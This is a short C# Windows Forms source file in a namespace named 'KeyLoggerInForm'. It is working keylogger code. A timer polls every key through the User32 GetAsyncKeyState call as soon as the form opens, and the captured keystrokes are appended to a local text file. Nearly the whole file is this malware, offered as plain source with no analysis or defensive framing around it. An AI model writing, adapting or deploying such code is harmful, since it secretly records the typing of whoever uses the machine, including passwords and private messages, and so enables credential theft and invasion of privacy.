using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace KeyLoggerInForm
{
    public partial class MainForm2 : Form
    {
        
        

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vkey);

        public MainForm2()
        {
            InitializeComponent();
            TimerKL.Start();
        }
        string text = "";

        private void TimerKL_Tick(object sender, EventArgs e)
        {
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    buffer += Enum.GetName(typeof(Keys), i);
                }
            }
            text += buffer;
            if(text.Length > 10)
            {
                WriteTotext(text);
                text = "";
            }
        }
        private void WriteTotext(string value)
        {
            StreamWriter stream = new StreamWriter("KeyLogStreamVoblav.txt", true);
            stream.Write(value);
            stream.Close();
        }
    }
}
